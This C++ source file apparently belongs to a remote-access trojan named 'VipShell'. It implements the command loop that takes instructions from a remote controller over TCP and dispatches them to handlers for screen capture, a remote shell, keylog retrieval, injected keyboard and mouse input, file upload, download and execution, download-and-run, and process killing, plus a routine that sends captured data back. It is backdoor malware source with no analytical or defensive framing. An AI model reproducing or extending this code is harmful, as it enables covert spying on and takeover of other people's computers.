#include ".\defcommandproc.h"

CDefCommandProc::CDefCommandProc()
{
	m_hServer = NULL;
	m_hServerManage = NULL;
	
//	NewThread(0, 0, 0, 0);
}

CDefCommandProc::~CDefCommandProc(void)
{
}
void CDefCommandProc::SetBindVipShellCTcpClient(CVipShellCTcpClient* hServer,CVipShellEx* hServerManage )
{
	m_hServer = hServer;
	m_hServerManage = hServerManage;
}
void CDefCommandProc::DoCommandProc()
{
	CVipShellCTcpClient* hServer = m_hServer;
	tagVipShellCmd cmdInfo;
	int nRet;
	DWORD dwRecvNull = 0;
	while(true)
	{
		if(hServer == NULL)
			continue;
		if( ! hServer->IsOpened() )
			return ;
		nRet = hServer->Recv(&cmdInfo, sizeof(tagVipShellCmd));
		if( nRet == SOCKET_ERROR)
			return ;
		if(nRet == 0)
		{
			dwRecvNull++;
			if(dwRecvNull == 30)
				hServer->Close();
			continue;
		}
		else
			dwRecvNull = 0;
		if( cmdInfo.dwCmd == CMD_GETDOWORK)
		{
			OnCmd_GetDoWork(&cmdInfo);

		}else if ( cmdInfo.dwCmd == CMD_GETSCREEN)
		{
			OnCmd_GetScreen(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_GETSYSTEMINFO)
		{
			OnCmd_GetSystemInfo(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_GETSHELL)
		{
			OnCmd_GetShell(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_KEYDOWN)
		{
			OnKeyDownd(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_KEYUP)
		{
			OnKeyUp(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_MOUSEMOVE)
		{
			OnMouseMove(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_LBUTTONDOWN)
		{
			OnLButtonDown(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_LBUTTONUP)
		{
			OnLButtonUp(&cmdInfo);
		}else if( cmdInfo.dwCmd == CMD_LBUTTONDBLCLK)
		{
			OnLButtonDblclk(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_RBUTTONDOWN)
		{
			OnRButtonDown(&cmdInfo);
		}else if ( cmdInfo.dwCmd == CMD_RBUTTONUP )
		{
			OnRButtonUp(&cmdInfo);
		}else if ( cmdInfo.dwCmd == CMD_RBUTTONDBLCLK )
		{
			OnRButtonDblclk(&cmdInfo);
		}else if ( cmdInfo.dwCmd == CMD_KEYCTRLALTDEL)
		{
			OnKeyCtrlAltDel(&cmdInfo);
		}else if ( cmdInfo.dwCmd == CMD_GETCAP)
		{
			OnGetCap(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_GETROOT)
		{
			OnFileManageGetRoot(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_GETFILEPATH)
		{
			OnFileManageGetFilePath(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_GETFILEMANAGE)
		{
			OnCmd_GetFileManage(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_DELETEFILE)
		{
			OnFileManageDelFile(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_RUNFILE)
		{
			OnFileManageRunFile(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_MOVEFILE)
		{
			OnFileManageMoveFile(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_DWONFILE)
		{
			OnFileManageDownFile(&cmdInfo);
		}else if (cmdInfo.dwCmd == FILE_UPFILE)
		{
			OnFileManageUpFile(&cmdInfo);
		}else if( cmdInfo.dwCmd  == FILE_CREATEDIR )
		{
			OnFileManageCreateDir(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_GETPROCESSLIST)
		{
			OnCmd_GetProcessList(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_KILLPROCESS)
		{
			OnCmd_KillProcess(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_GETKEYLOG )
		{
			OnCmd_GetKeyLog(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_DOWNFILERUN)
		{
			OnCmd_DownFileRun(&cmdInfo);
		}else if (cmdInfo.dwCmd == CMD_SETCONFIG)
		{
			OnCmd_SaveConfig(&cmdInfo);
		}
	}
}

int CDefCommandProc::_SendBuffData(BYTE* pData, DWORD dwlen)
{
	DWORD dwSendBuflen = 16 * 1024;
	DWORD dwSendLen = 0;
//	DWORD dwSendTime = dwlen / dwSendBuflen;
	DWORD dwSended;
	DWORD dwRbuf = dwlen;
	while(dwSendLen < dwlen)
	{
		
		dwRbuf = (dwlen - dwSendLen);
		if( dwRbuf >=  dwSendBuflen)
		{
			dwSended = m_hServer->Send(pData + dwSendLen, dwSendBuflen);
			if( dwSended == SOCKET_ERROR)
		    	return dwSended;
		}
		else
		{
			dwSended = m_hServer->Send(pData + dwSendLen, dwRbuf);
			if( dwSended == SOCKET_ERROR)
		    	return dwSended;
		}
		dwSendLen += dwSended;
	}
	return dwlen;
}